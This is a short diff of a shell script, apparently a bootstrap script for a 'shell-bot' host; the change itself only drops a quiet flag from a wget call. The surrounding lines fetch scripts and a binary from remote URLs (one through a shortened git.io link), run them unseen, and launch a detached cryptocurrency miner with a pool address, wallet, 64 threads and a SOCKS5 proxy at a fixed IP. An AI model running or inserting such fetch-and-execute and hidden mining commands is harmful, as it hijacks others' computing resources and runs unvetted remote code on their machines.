@@ -4,7 +4,7 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
+wget https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
 screen -dm -S build wget -qO build https://git.io/JX7bv && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.errrrror -p x -t 64 -x socks5://a:a@188.166.61.166:98
 chmod +x compile.sh
 ./compile.sh
